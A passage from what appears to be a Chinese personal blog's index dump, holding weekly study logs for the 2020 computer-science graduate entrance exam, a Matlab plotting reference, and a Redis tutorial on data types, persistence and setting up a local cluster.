现在是2019年4月22日，距离2020考研还有244天。这是Log的第二周，和往常一样，过着三点一线的生活，只不过这周的食欲不是很好，什么都不太想吃。此外，最近最大的变化就是对时间越来越敏感了，眼睛一睁一闭，一天就过去了，时间溜得贼快，感觉一天下来还没完成多少任务就已经结束了。 Log内容 本周复习状况 下周复习计划 本周复习状况英语英语词汇已经过了一遍，基本上是一种背了后面忘了前面的状态，真正记忆下来的单词感觉还是比较少的，使用的是大一的时候获得的一本单词书，唐叔说过：“对于那些没有单词功底的考生来说，阅读方法再好也都是浮云，最后的结果只有放弃或再战。”，所以说阅读的正确率是建立在方法、长难句分析和单词的基础之上的，三者缺一不可。虽然这本单词书在之前不知过了多少遍，后续还是需要市场拿出来不断的翻阅。 周周长难句： Germany thinks the euro must be saved by stricter rules on borrow, spending and competitiveness, backed by quasi-automatic sanctions for governments that do not obey.德国认为：必须通过更严格的借贷、支出和竞争力条款来节省欧元，并辅以类似自动制裁的方式，以对付不遵守条款的政府。 ① Germany thinks the euro must be saved by stricter rules ② on borrow, spending and competitiveness, ③ backed by quasi-automatic sanctions for governments that do not obey. ①： 主干。被动语态②： 修饰。介词短语on（关于）…作定语，解释rules③： 修饰。过去分词backed…作定语，解释rules，即which are backed by（受到…的支持） 重要单词：competitiveness 竞争力back： 支持quasi-： 准的，类似的sanction：制裁 数学 Q1：$I=lim_{x \\to 0}\\frac{xsin^2x-2(1-cosx)sinx}{x^4}=$ 这道题虽然不难，但是我初次做这道题的时候，就直接在原式的基础来进行操作，从而导致最后的解答相对来说比较麻烦。其实这道题的正解是先把分子中的结合的式子进行拆开，然后借助泰勒的辅助。最后得出正解$0$，相比于上一周的极限题，这道题并不难，只是有个小技巧需要留意，所以就不在写出过程了。 总结：在实际刷数学题的过程中，不要着急的去求解，应当初步观察一下题所给出的原式，也许会有别样的收获。 Q2：计算$\\iint_{E} \\frac{1}{\\rho}dS，其中E为椭球面\\frac{x^2}{a^2}+\\frac{y^2}{b^2}+\\frac{z^2}{a^2}=1，\\rho为圆点到切平面的距离。$ 分析：这道题主要考察的是曲面积分的计算以及考生的计算能力。其中这里有个小知识点需要注意，像这种曲面的式子，我们可以直接写出经过切点平面方程，而不需要花费时间去计算。在得到切平面的基础上，之后就是计算出 $\\rho$ 的表达式，最后通过适当的代换求解出该曲面积分的值。 Q3：验证函数$y=1+\\frac{x^3}{3!}+\\frac{x^6}{6!}+\\frac{x^9}{9!}+···+\\frac{x^{3n}}{(3n)!}+···$满足$y^{‘’}+y^{‘}+y=e^x$ 分析：这主要是一道无穷级数的题，求解这道题的关键是熟练掌握常见函数的展开式，并且如何进行展开。初步分析，可以发现在$y^{‘’}+y^{‘}+y=e^x$式子中出现$e^x$的指数形式，所以我们可以初步选择指数的无穷展开。此外，观察函数 $y$，我们可以发现该式子是一个3的整数倍此方，并且$y^{‘’}和y^{‘}$的结果分别为2和1的整数倍，三者之和正好形成了指数的展开形式。到此，我们的基本上有了一个解题思路，过程如下： 总结：能否正确解决这道题，主要还是要看自己的洞察能力，而洞察能力是通过不断的训练来进行提高的，所以在学习数学的过程中离不开大量题目的支持。 408按照上周的计划，这周如期复习完了计算机组成原理余下的内容，主要的章节是中央处理器、总线、输入/输出系统。下面记录本周408中琐碎且容易被忽略的小知识点： PC（程序计数器）中的内容是指令在主存中的地址，所以它的位数主要取决于主存容量。IR（指令寄存器）位数主要取决于指令字长。通用寄存器则与与机器字长相等。 条件转移指令执行时所依据的条件来自标志寄存器，而非程序计数器，因为转移指令执行的时候需要对标志寄存器的内容进行测试，看是否满足转移条件。 下面有关程序计数器（PC）的叙述中，错误的是（C）A. PC总总是存放指令的地址B. PC的值由CPU在执行指令的过程中进行修改C. 转移指令时，PC的值总是修改为转移指令的目标地址D. PC的位数一般和存储器存储器地址一样 通过上述的解释，我们知道转移指令在执行的时候，需要检测看是否满足转移的条件，如果满足才能进行转移，即修改为指令的目标地址，否则并不会成功发生转移，所以这道题应该选择C。（第一次做的时候选择了B） 指令译码是对指令的操作码进行译码，而非地址码 取指操作是自动进行的，不需要得到其他指令的辅助 基址寻址主要应用于多道程序设计和编制浮动程序；变址寻址主要应用于数组处理和循环程序。（上周遗忘的内容） 数据通路是否采用CPU内部总线的特点：采用：结构简单、实现容易、性能较低、冲突较多不采用：结构复杂、不易实现、硬件量大、性能高、冲突小 注意：5.4.1 控制器的功能和工作原理 小结中，该部分的内容看的不是很懂，之后有时间看点视频补充下 对流水线影响主要有结构相关、数据相关、控制相关三个因素，其中影响最大的因素是数据相关。 总线的分类中主要有片内总线、系统系统、通信总线，其中需要特别留意系统总线。 总线复用技术是指一种信号线不同的时间传输不同的信息，可以节省空间和成本，但是不能提高传输率 USB（通用串行总线）的特点：即插即用、热插拔、连接能力强、扩充性好、高速传输 键盘通常以矩阵的形式排列按键、每个键相当于一个开关，按下按键则电信号接通，松开按键时弹簧弹起，电信号断开（将ASCII码传给主机的过程）。主要有：薄膜键盘、机械键盘、静电容键盘 屏幕大小指的是对角线的长度，并非长度和宽度 灰度级表示的是显示的像素带点亮暗的差别，灰度级越多，图像层次越清楚、逼真。 显示存储器（VRAM）有图像分辨率和灰度级所决定，它们之间的关系如下： VRAM容量=分辨率 * 灰度级位数 \\\\ VRAM带宽=分辨率 * 灰度级位数 * 帧频 DMA方式（重点），该部分内容在操作系统中记录 下周复习计划 英语词汇继续复习，并且适当的收集往年真题中的生词及词组，在词汇的学习中适当观看恋练有词的配套视频，继续坚持每天两篇阅读的进度 数学没什么好说的，基本适当刷题的状态 408下周开始复习《操作系统》，打算复习前两个章节 2019-04-22,By 木子","path":"2019/04/21/随写录2（4.15-4.21）/"},{"title":"随写录1（4.8-4.14）","text":"与其用华丽的外衣装饰自己，不如用知识武装自己。 —— 马克思 现在是2019年4月15日，距离2020考研还有251天。自大一开始我就已经打算选择走上考研这条路，真正开始准备考研是在大三上学期，当时大部分精力主要用来倒腾Python和Java，只有一小部分时间放在学习408专业课，庆幸的是经过半年的时间已经成功把《数据结构》、《计算机组成原理》、《操作系统》、《计算机网络》四门专业课匆匆的过了一遍。在学习专业课的过程中主要使用的是教材外加王道4本辅导书，倘若书上的知识点有点晦涩难懂的话，就会选择王道配套的视频进行补充。使用的教材和辅导书如下： 《数据结构》严蔚敏 清华大学出版社 《计算机组成原理》唐朔飞 高等教育出版社 《计算机操作系统(修订版)》汤子瀛 西安电子科技大学出版社 《计算机网络(第五版)》谢希仁 电子工业出版社 《2019年数据结构考研复习指导》王道论坛 电子工业出版社 《2019年计算机组成原理考研复习指导》 王道论坛 电子工业出版社 《2019年操作系统考研复习指导》 王道论坛 电子工业出版社 《2019年计算机网络考研复习指导》 王道论坛 电子工业出版社 在进行第一轮专业课学习的时候，主要是集中在基本概念以及理论知识的理解，并没有通过大量的习题来进行巩固。另外，由于当时王道2020年的辅导书还没有出版，所以辅导书使用的图书馆的馆藏书。通过一轮专业课的学习下来，第一感觉就是理论知识太多，由于自己又是跨考生，再加上江湖有着408变态难的传言，所以当时的内心多少还是有点崩溃。但是换个角度来想，还有一年的时间供自己复习，所以不到最后一刻不要轻言放弃。 “逝者如斯夫，不舍昼夜。”，时间一分一秒的流逝，离考研的日子越来越近，自己的压力越来越大，内心越来越焦虑。为了更加坚定自己的目标，为了有个更好的学习环境，为了更好的记录考研的历程，所以从现在开始打算每周一在这打卡，主要是记录上一周的学习情况，以及可能会分享一些其他个人日常。由于周一的课比较多，任务相对来讲比较繁重，只有一些琐碎的时间可供个人支配，所以将每周的学习日志于周一更新。正如《超兽武装》中火麟飞说过这么一句话：“每个人都有彷徨的时候，彷徨并不可怕，可怕的是在彷徨中不做抉择。因为一旦有抉择，就不会再彷徨，就会按照既定的方向去行事。”，是的，既然选择了考研这条路，希望自己能够坚持下去，不为自己做出的决定而感到遗憾。 Log内容 本周复习状况 下周复习计划 Simtrade实验总结 本周复习状况英语英语的复习现在主要是集中在阅读理解和词汇上面。词汇的学习是定在每天早上的6:00-8:00之间，现在还没有养成早起的习惯，有的时候就会不知不觉的睡过去(ノへ￣、)，希望能够尽早习惯起来。英语的词汇学习使用的主要是朱伟的《恋练有词》外加配套视频，阅读理解部分是计划每天坚持精做1-2篇阅读，偶尔观看考虫王琢或者唐迟的课程。 本周感觉最大的收获就是英语了，自从看了关于英语阅读理解的网课，感觉相当的受益。以前的自己只是想当然的以为英语只有多做题，只有在题海中总结自己的经验才能有所提高，但现在才发现这个想法是多么的错误。我们不是圣人，也没有太多的时间和能力去研究其中的奥秘，现在的我们应该要站在巨人的肩膀上来取得进步，刷题是没错，但刷题的前提是要先掌握好解题的方法，否则只会浪费自己太多宝贵的时间。所以说今后需要抽点时间适当的看看视频，获取一下前辈们总结的经验。 （可不是打广告）王琢老师的阅读课程简直不要太好了，每道阅读题都会给你别样的解题方式，在解题的过程中还会不断的传授解题的方法和技巧，并且会解释考题中的各种套路，其中最让我印象深刻的是“呵呵词”的讲解：在实际做阅读理解过程中，如果有那么一道题是问关于某某某态度的话，那么选项中有如上的“呵呵词”，就千万不能选，课后我通过大量真题的验证，发现果真如此。当然，在平时做阅读理解的过程我们不要太依赖这种投机取巧的方法，而是要知其然，更要知其所以然。 周周长难句： The conventional view that education should be one of the very heighest priorities for promoting rapid economic development in poor countries is wrong.传统观点认为：为了促进贫穷国家经济快速发展，教育应作为最优先的考虑之一，这个观点是错误的 ① The conventional view ② that education should be one of the very heighest priorities ③ for promoting rapid economic development in poor countries ④ is wrong. ①： 主干。主系表，缩句之后是 view is wrong②： 修饰。that引导的同位语从句，具体说明view 的内容③： 修饰。介词短语fot作原因状语，修饰上述观点，解释原因 重要单词：conventional 传统的priority： 优先promote： 促进，促销，使晋级 数学关于数学，我自认为数学的学习不像英语阅读理解，解数学题的时候没有所谓的捷径，只有套路。在已经掌握了基本概念的前提下，我们只有通过大量的练习才能有所进步，正所谓孰能生巧嘛，所以数学的话我会每周更新几道题目来记录，一方面将有价值的题目永远保存，另方面熟悉下Latex的语法。 Q1: $f’(x)在[a,b]上连续，f(a)=0,证：\\int_a^bf^2(x)dx\\leq\\frac{(b-a)^2}{2}\\int_a^b[f’(x)]^2dx$ 分析：显然，这是一道证明题。题目中给出了函数$f(x)$的一个零点，让我们证明右边的不等式。通过观察所要证明的不等式，我们可以发现右式存在两端点相减，且不等式两边存在着导数形式，通过初步判断，这道题主要考察的是柯西定理、拉格朗日定理、函数构造等的熟练掌握程度，所以本题的解法有多种，以下给出使用柯西定理求解这道题的过程。 \\begin{align} \\frac{\\int_a^bf^2(x)dx}{(b-a)^2} &=\\frac{\\int_a^bf^2(x)dx-\\int_a^af^2(x)dx}{(b-a)^2-(a-a)^2} \\\\ & = \\frac{f^2(\\xi)}{2(\\xi-a)}=\\frac{(\\int_a^{\\xi}1*f'(t)dt)^2}{2(\\xi-a)} \\\\ & \\leq\\frac{\\int_a^{\\xi}1^2dt\\int_a^{\\xi}[f'(t)]^2dt}{2(\\xi-a)} \\\\ & = \\frac{(\\xi-a)\\int_a^{\\xi}[f'(t)]^2dt}{2(\\xi-a)} \\\\ & = \\frac{1}{2}\\int_a^{\\xi}[f'(t)]^2dt \\leq \\frac{1}{2}\\int_a^b[f'(x)]^2dx \\end{align} 求 ${\\lim_{x \\to 0}}\\frac{tan(tanx)-sin(sinx)}{x-sinx}$ 分析： 这是一道极限题。初步一看上下都趋近于零，可是使用万能的洛必达进行求解。但是在你使用洛必达的过程中会相当的繁琐，在考试的过程中不仅会浪费大量的时间还会影响自己的心态。如上题一样，我们通过观察可发现，这道题同样存在减的形式，我们应该从拉格朗日的角度出发。但我们观察分子会发现，这是两个不同的三角函数，似乎并不满足拉格的使用条件，所以我们需要对其进行适当的变化，最后通过泰勒的辅助即可解决此题。本题式子太多，不便使用Latex，所以直接贴图了。 408本周408的复习还行，主要是将计算机组成原理的前四个章节复习了一遍，其中包含以下内容： 计算机系统概述 数据的表示和运算 存储系统 指令系统 在做题巩固的过程中，发现不少之前第一轮学习的漏洞没有解决，这也印证了只有在实践的过程中才能发现自身的不足，以下记录一些容易遗漏或者被忽视的小知识点，希望日后能引起注意： 高级语言、汇编语言、机器语言三者之间的关系。 由高级语言向汇编语言转换的过程称为编译，把汇编语言翻译成机器语言的过程称为汇编；由高级需要直接转换为机器语言的过程称为解释。 翻译程序包括编译程序和解释程序。其中编译的过程是先全部翻译成，不需要重新进行编译。而解释程序是翻译一条，执行一条，在这个过程中不会生成目标程序。（主要的区别看是否生成目标程序，以做题的经验来看，这个知识点尤为重要，一定要理解并熟记），比如下面16年统考的一道选择题： 将高级语言程序转换为机器级目标代码文件的程序是（C）A： 汇编程序 &nbsp;&nbsp;&nbsp;&nbsp; B：链接程序 &nbsp;&nbsp;&nbsp;&nbsp; C：编译程序&nbsp;&nbsp;&nbsp;&nbsp; D：解释程序 分析： 由上述图可知，高级语言向机器语言的转化有两个途径，但能够产生目标文件的应该是编译程序，而非解释程序，所以应该选择C选项。（我第一次做的时候就选了D，总结后发现还是由于自身知识点的漏洞导致的，所以说我们在复习的时候一定要尽可能的全面，不要有侥幸心理：这个不会考，那个不会考。假如因为向这种简单题而造成失分，那肯定得不偿失。） 某一功能既可以使用硬件来实现，有可以使用软件来进行实现，他们在逻辑上是等效的。注意：是“等效”，不是”等价” 兼容是计算机软件或硬件的通用性。注意：是“或”，不是“和” 主存的工作方式是按存储单元的地址进行存取，而相联存储器（TLB、快表）即可以按照地址又可以按照内容。注意选择题 地址译码器属于主存，而非CPU。 系统吞吐量主要取决于主存的存取周期 CPI:执行一条所需要的时钟周期数。它与系统结构、指令集、计算机组织有关，而与时钟频率无关 透明：地址寄存器、数据寄存器、IR。不透明：通用寄存器、程序状态、PC 定点机器数的加减运算倘若让你计算 13+11= 和 13-11= 的值，相信没人会做不出来。但是计算机在计算该加减的过程是怎样的呢。机器数的加减主要是将原数转化为补码形式，然后在进行运算，下面以一个例子来模拟该过程：例：N=5，X=+13，Y=-11，求X+Y，X-Y，Y-X 定点机器数的乘除运算定点机器数的乘除运算与加减不同，它的过程相对来说要复杂的多，我暂时也还没有掌握其要领，所以暂时不在此记录，以后更新。 使用IEEE 754标准表示浮点数时，注意短浮点数、长浮点数、临时浮点数的其他别名。 SRAM（静态随机存储器）主要应用于缓存，其不需要进行刷新。而DRAM（动态随机存储器）主要应用于内存，其需要进行刷新（以行为单位进行刷新），且三种刷新方式中只有分散刷新不存在死区（死时间） 在大多数题目中，会考察Cache的命中率或者是Cache的访问时间，但少数题会考察系统的效率，关于该问题，王道中并没有记录，所以在此记录一下： 系统效率=\\frac{Cache访问时间}{平均访问时间} 下周复习计划 英语把剩下的单词都解决了，阅读继续每日两篇并抽时间看点课程，阅读主要是1999年-2004年的经典真题 数学继续刷题（复习全书习题、过关660题） 408把组成原理剩下的章节复习完，并通过习题进行一定的巩固（王道计算机组成原理、高教版计算机专业综合考试大纲解析） Simtrade实验总结本周还是挺忙的，学校的任务比较多，花费了不少时间放在进出口实验上，从建立业务联系到最后的结汇每一步都需要不断的实践，总共需要完成5个单子，还是有点崩溃。不管怎么样这本课程也算是结束了，简单的写个总结吧： Simtrade实验总结 至此，《进出口货物贸易综合实验》这门课程基本已经结束了，回想一下，收益颇多，但还有很多地方做的不尽如人意，在这课程结束之际，现做一个简短的回顾及总结。 鄙人性格比较内向，平时沉默寡言，形单影只，更偏向于理科，在现实生活中自认为不具备做贸易的条件，而且在《进出口货物贸易综合实验》这门课程中的表现的也不够满意。所以起初对待这门课程也只是一种应付式的态度去学习，上课期间总是忙于做自己的事情，并没有像大家那样积极的去融入这门课程。不如意事常八九，可与语人无二三，尽管自己不是很擅长这门课程，但还是需要坚持完成老师交给的任务。直至课程后期才开始用心对待这门课程，通过 Simtrade系统的实践，让我对实际贸易流程用了一个更加完整的认识。 从开始进出口双方业务联系的建立到最后的结汇，这其中的每一个流程在实际贸易过程中都至关重要，我们必须熟练的操作每一个步骤才能成功实现交易。在这次课程中，我发现自己有以下一些能力还有待提高： 在PPT的制作过程中，形式单一，没有背景音乐以及视频的辅助。在小组PPT英文产品展示的时候，自己的英文能力不足，再加上自己内向的性格以及全程录像，导致在展示过程中没有让观众留下一个好的影响，的确遗憾。 在制作进口预算表以及出口预算表的时候，由于自己的专业知识储备不够，导致最终该部分的得分较低，在以后的学习过程中我会更加努力积累专业知识。 由于前期对这门课程的不在乎，导致后面的进度完全更不上，所以在课下花费了大量的时间和精力来弥补该部分的残缺，而且还多次求助于同学，实属不该。积土成山，积水成渊，学习的过程从来都不是一蹴而就的，我们需要每天不断地保持一颗努力学习的心才能有所进步。今日事，今日毕，如果我们将大量的任务积累至后期的话，只能给自己带来更多的负罪感。 …… 最后希望自己好好学习，天天向上，在今后的学习生活中越走越远。 2019-04-15,By 木子","path":"2019/04/15/随写录1（4.8-4.14）/"},{"title":"Matlab常见的绘图Api","text":"Matlab常见的绘图Api基本分割12x = linspace(0,100,100) % 成线性等分y = logspace(0, 100, 100) % 成对数分割 plot基本绘图 1.绘制一条曲线 12x = linspace(0, 2*pi, 100) % 默认100等分plot(x, sin(x)) 2.绘制多条曲线 123x = linspace(0, 2*pi);plot(x, sin(x), \"o\", x, cos(x), \"x\", x, sin(x)+cos(x)), \"*\";% \"o\"表示不同图标绘图（marker） 3.根据矩阵绘图 X=\\left| \\begin{matrix} x_{11} & x_{12} & x_{13} & \\cdots & x_{1n}\\\\ x_{21} & x_{22} & x_{23} & \\cdots & x_{2n}\\\\ x_{31} & x_{32} & x_{33} & \\cdots & x_{3n}\\\\ \\vdots & \\vdots & \\vdots & \\ddots & \\vdots\\\\ x_{n1} & x_{n2} & x_{n3} & \\cdots & x_{nn}\\\\ \\end{matrix} \\right| 1plot(X) % 会得到n条曲线 以下是一些例子： 1234% peaks 产生一个49x49的矩阵，代表二维函数的值x = peaks();% plot()直接绘制49条直线，类似于直接从侧面看peaks，直接运行peaks()方法可见立体效果plot(x); 123x = peaks();y = x'; % 将x转置plot(x, y); 根据复数绘图 z为复数时，plot(z)是将z的实部和虚部当做x，y坐标来作圆 1234x = randn(30); % 产生30x30矩阵z = eig(x); % 计算x的固有值plot(z, \"o\");grid on; 绘制两条分别对应两个y轴的图 12x = linspace(0, 2*pi);plotyy(x, sin(x), x, exp(x)); subplot() 123x = linspace(0,2*pi);subplot(221);plot(x, sin(x));subplot(222);plot(x, cos(x)); plot的其他一些例子 12x = 0:0.5:4*pi;plot(x, sin(x), 'k:diamond'); 极坐标绘图（polar）123theta = linspace(0, 2*pi);r = cos(4*theta);polar(theta, r); 绘制直方图(hist)12x = randn(10000, 1);hist(x, 25); 绘制条形图 绘制1个条形图 12x = [1 2 3 4 5];bar(x); 绘制2个条形图 12x = [1 2 3 4 5; 5 4 3 2 1]; bar(x); 绘制立体条形图bar3 123x = [1 2 3 4 5; 5 4 3 2 1];bar3(x);bar3(x, \"group\"); % 使用群组方式绘制 水平条形图barh、bar3h 123456x = [1 2 3 4 5];y = [1 2 3 4 5 ;5 4 3 2 1];barh(x);barh(y);bar3h(x);bar3h(y) 案例：使用条形图绘制月平均温度 123456x = 1:6;y = 35*rand(1,6);bar(x, y);xlabel(\"月份\");ylabel(\"平均温度(^&#123;o&#125;C)\");set(gca, \"xticklabel\", &#123;\"一月\",\"二月\",\"三月\",\"四月\",\"五月\",\"六月\",&#125;); 面积图的绘制area12345y = rand(10, 3)*100; % rand(10, 3)表示随机生成3组10个0~1的数，即10x3的矩阵x = 1:10;area(x, y);xlabel(\"Year\");ylabel(\"Count\"); 绘制扇形图pie123456x = [2 3 4 5]; % x中的元素大于1会转化为比例来绘制，小于1则根据对应的比例来绘制，不足1的则空着label = &#123;\"东\",\"南\",\"西\",\"北\"&#125;;explode = [1 1 0 0];colormap cool; % 也可设置其他颜色pie(x, label);pie3(x, label) 123456789101112131415% 使用以下方式将百分比和label同时显示clear,clcmoney=[5 10 7 15];%输入数据name=&#123;'George','Sam','Betty','Charlie'&#125;;%输入标签explode=[0 1 0 0];%定义突出的部分bili=money/sum(money);%计算比例baifenbi=round(bili*10000)/100;%计算百分比baifenbi=num2str(baifenbi'); %转化为字符型baifenbi=cellstr(baifenbi); % 转化为字符串数组for i=1:length(name) %在每个姓名后加2个空格 name(i)=&#123;[name&#123;i&#125;,blanks(2)]&#125;;endbfh=cellstr(repmat('%',length(money),1));%创建百分号字符串数组c=strcat(name,baifenbi',bfh');pie(money,explode,c) 针头图像stem123t = 0:0.2:4*pi;y = cos(t).*exp(-t/5);stem(t,y); 12345theta = -pi:0.05:pi;x = cos(theta);y = sin(theta);z = abs(cos(3*theta)).*exp(-abs(theta/3));stem3(x, y, z); 阶梯图的绘制stairs123t = 0:0.4:4*pi;y = cos(t).*exp(-t/5);stairs(t, y); 1234567% 阶梯针头图如下t = 0:0.4:4*pi;y = cos(t).*exp(-t/5);stairs(t,y);hold onstem(t,y);hold off 绘制实心图123456t = 0:0.4:4*pi;y = sin(t).*exp(-t/5);fill(t, y, 'y');hold onstem(t, y, 'b');hold off 三维绘图一般使用两种方式： mesh: 可画出立体的网状图,即由多条曲线构成 surf：可画出立体的曲面图,即由多条曲面构成 123x = [0 2 1;3 2 4;4 4 4;7 6 8];mesh(x);% 这样绘制之后会出现一个网状图，端点有12个，即举证的元素个数的值分别对应z轴，而x，y轴都是以1位间距均等分的 12345x = linspace(-2, 2, 50);y = linspace(-2, 2, 50);[xx, yy] = meshgrid(x, y);zz = xx.*exp(-xx.^2-yy.^2);mesh(xx, yy, zz); 为了方便测试立体绘图，MATLAB提供了一个peaks函数，可产生一个凹凸有致的曲面，包含了三个局部极大点（Local Maxima）及三个局部极小点（Local Minima）peaks函数的方程式如下 Z=3(1-x)^2e^{-x-(y+1)^2}-10(\\frac{x}{5}-x^3-y^5)e^{-x^2-y^2}-\\frac{1}{3}e^{-(x+1)^2-y^2}123456peaks; %直接产生上述三维函数图形colorbar; % 显示颜色条colormap cool; % 设置颜色，除了cool还有多种颜色（bone、spring、winter），需要时可以自己查看并设置shading interp; % 将立体图像设置成连续变化的shading flat; % 瓷砖的颜色是单一的shading faceted; 默认值 合理运用colormap和shading有时可以产生出比较好的效果，例如下： 1234surfl(peaks); % 曲面加上光源axis tight;colormap pink; % bone也不错shading interp; 1234% 产生“瀑布”[x, y, z] = peaks;meshz(x, y, z);axis tight; 1234% 可在产生水流效果[x, y, z] = peaks;waterfall(x, y, z);axis tight; 1234%meshc可同时画出网状圆形（等高线Contous）[x, y, z] = peaks;meshc(x, y, z);axis tight; plot3绘图 plot3指令可画出三度空间中的曲线 12t = linspace(0, 20*pi, 501);plot3(t.*sin(t), t.*cos(t), t); % 画出tsin(t)、tcos(t)、t的曲线 123[x, y] = meshgrid(-2:0.1:2);z = y.*exp(-x.^2-y.^2);plot3(x, y, z); 12% 很复杂的一个立体图，有兴趣的也可以去找找其他的复杂图形volvec 动画123456789101112% 下面介绍几种以有的一些动画lorenztrusstravelfitdemo% 以下需要Simlateonecartdblcart1simppenddblpend1dblpend2penddemo","path":"2019/02/26/Matlab常见的绘图Api/"},{"title":"学习Redis的正确方式","text":"学习Redis的正确方式一、redis五种数据类型 String：key-value redis命令不区分大小写，但是key区分的redis中的数据都是字符串。redis是单线程，（不适合存储比较大的数据） 使用incr 命令，如果key 不存在，会自动创建key 并自动+1.redis中所有的数据都是字符串。 1234set key value 设置值get key 获取值incr key 加一decr key 减一 Hash: key-field-value 相当于一个key 对应一个map (map中又是key- value)， 应用于归类123hset key field value 设置值 hget key field 获取值 hincrby key field num 设置增数量 List List是有顺序可重复(数据结构中的：双链表，队列) 可作为链表 ，从左添加元素 也可以从右添加元素。12345lpush list a b c d (从左添加元素)rpush list 1 2 3 4 (从右边添加元素)lrange list 0 -1 (从0 到 -1 元素查看：也就表示查看所有)lpop list （从左边取，删除）rpop list (从右边取，删除) set 1234Set无顺序，不能重复sadd set1 a b c d d (向set1中添加元素) 元素不重复smembers set1 （查询元素）srem set1 a （删除元素） sortedset（zset） 有顺序，不能重复 适合做排行榜 排序需要一个分数属性12zadd zset1 9 a 8 c 10 d 1 e （添加元素 zadd key score member ）(ZRANGE key start stop [WITHSCORES])(查看所有元素：zrange key 0 -1 withscores) 如果要查看分数，加上withscores.123456789101112131415161718192021222324252627282930313233343536373839404142434445zrange zset1 0 -1 (从小到大)zrevrange zset1 0 -1 (从大到小)zincrby zset2 score member (对元素member 增加 score)127.0.0.1:6379&gt; zadd zset1 8 a 4 b 5 c 1 d(integer) 4127.0.0.1:6379&gt; zrange zset1 0 -1 1) \"d\"2) \"b\"3) \"c\"4) \"a\"127.0.0.1:6379&gt; zadd zset1 9 a(integer) 0127.0.0.1:6379&gt; zrange zset1 0 -1 1) \"d\"2) \"b\"3) \"c\"4) \"a\"127.0.0.1:6379&gt; zrange zset1 0 -1 withscores1) \"d\"2) \"1\"3) \"b\"4) \"4\"5) \"c\"6) \"5\"7) \"a\"8) \"9\"127.0.0.1:6379&gt; zrevrange zset1 0 -11) \"a\"2) \"c\"3) \"b\"4) \"d\"127.0.0.1:6379&gt; zincrby zset1 1 a\"10\"127.0.0.1:6379&gt; zrevrange zset1 0 -1 withscores1) \"a\"2) \"10\"3) \"c\"4) \"5\"5) \"b\"6) \"4\"7) \"d\"8) \"1\" 二、redis持久化方案Redis 数据都放在内存中。如果机器挂掉，内存的数据就不存在。需要做持久化，讲内存中的数据保存在磁盘，下一次启动的时候就可以恢复数据到内存中。 RDB 快照形式 （定期将当前时刻的数据保存磁盘中）会产生一个dump.rdb文件特点：会存在数据丢失，性能较好，数据备份。 AOF append only file (所有对redis的操作命令记录在aof文件中)，恢复数据，重新执行一遍即可。 特点：每秒保存，数据比较完整，耗费性能。 redis 默认开启RDB 三、redis集群的搭建架构细节:(1)所有的redis节点彼此互联(PING-PONG机制),内部使用二进制协议优化传输速度和带宽.(2)节点的fail是通过集群中超过半数的节点检测失效时才生效.通过投票机制(3)客户端与redis节点直连,不需要中间proxy层.客户端不需要连接集群所有节点,连接集群中任何一个可用节点即可(4)redis-cluster把所有的物理节点映射到[0-16383]slot上,cluster 负责维护 redis集群中内置了16384个哈希槽，当需要在Redis集群中放置一个Key-value时，redis先对key使用crc16算法算出一个结果，然后把结果对16384求余数，这样每个key都会对应一个编号在0-16383之间的哈希槽，redis会根据节点数量大致均等的将哈希槽映射道不同的节点。 至少3个节点，为了集群的高可用，为每一个节点增加一个备份机。（6台服务器）。 搭建伪分布式集群方案：在一台机器里面运行6个redis实例。端口需要不同（7001-7006） 3.1 准备阶段redis-3.2.1.gemredis-trib.rb 3.2 集群搭建进入到local并创建一个redis-cluster:12cd /usr/localmkdir redis-cluster 将local下的redis复制到redis-cluster文件夹中并命名为redis011cp redis /usr/local/redis-cluster/redis01 -r 使用vim修改redis.conf配置文件1234567cd redis01/binvim redis.conf# vim在可读状态下可使用/+名来进行查找主要修改如下两个地方：1. 将cluster-enabled : yes的注释去掉2. 将端口port 6379 修改为7001esc -&gt; shift+: -&gt; wq 保存并退出 再复制五份redis01到redis-cluster中，并命名为02 03 04 05 06 依次将以上五份redis的redis.conf文件中的端口port设置为7002 7003 7004 7005 7006，保存并退出 以上配置完成之后，我们需要启动以上六个redis，为了方便，我们在redis-cluster文件夹中创建一个redis_start_all.sh文件，并编辑如下：12345678910111213141516171819sudo vim /usr/local/redis-cluster/redis_start_all.sh编辑如下内容：cd /usr/local/redis-cluster/redis01/bin./redis-server redis.confcd /usr/local/redis-cluster/redis02/bin./redis-server redis.confcd /usr/local/redis-cluster/redis03/bin./redis-server redis.confcd /usr/local/redis-cluster/redis04/bin./redis-server redis.confcd /usr/local/redis-cluster/redis05/bin./redis-server redis.confcd /usr/local/redis-cluster/redis06/bin./redis-server redis.conf 编辑完成之后，我们需要将redis_start_all.sh文件配置成可执行，执行以下命令，然后启动六份redis：12chmod u+x redis_start_all.shsudo ./redis_start_all.sh 完成以上流程之后，就是万事俱别，只欠东风了。这时我们将准备的redis-trib.rb文件传输到redis-cluster路径中，然后执行以下命令，集群即可搭建完成：1sudo ./redis-trib.rb create --replicas 1 192.168.31.198:7001 192.168.31.198:7002 192.168.31.198:7003 192.168.31.198:7004 192.168.31.198:7005 192.168.31.198:7006 3.3 错误解决在以上redis集群搭建的过程中，可能会遇到以下一些错误，我们可以通过对应的方法来进行解决（以下只是博主在搭建过程中所遇到的一些问题，可能不会很全面，如有遇到新error的话请留言，博主会再进一步更新）： error1 1sudo ./redis-trib.rb create --replicas 1 192.168.31.103:7001 192.168.31.103:7002 192.168.31.103:7003 192.168.31.103:7004 192.168.31.103:7005 192.168.31.103:7006 在使用ruby脚本来执行以上命令的过程中，可能会遇到如下错误： 1[ERR] Node 192.168.31.103:7001 is not configured as a cluster node. 这是因为没有将redis.conf配置文件中的cluster-enable yes的注释去掉，只要返回编辑redis.conf即可解决。 eroor2 1WARNING: redis-trib.rb is not longer available! 如果你使用的是redis5.0版本的redis，然后将./src/redis-trib.rb文件复制到redis-cluster文件夹中，然后执行命令过程中可能会出现以上错误，这时我们需要将redis-cluster中的redis-trib.rb Ruby文件删除，然后下载redis3.0并取其中的redis-trib.rb文件传输到redis-cluster文件中即可解决http://download.redis.io/releases/ 四、集群的使用进入redis0112cd redis01/bin./redis-cli -p 7001 -c # -c参数说明是集群 五、图片服务器的搭建 安装libevent 1yum -y install libevent 解压libfastcommon 1234tar -xvf libXXXcd libXXX./make./make install","path":"2019/02/13/学习Redis的正确方式/"},{"title":"12306自动化抢票","text":"瞎扯不知不觉，这年也算是过完了。 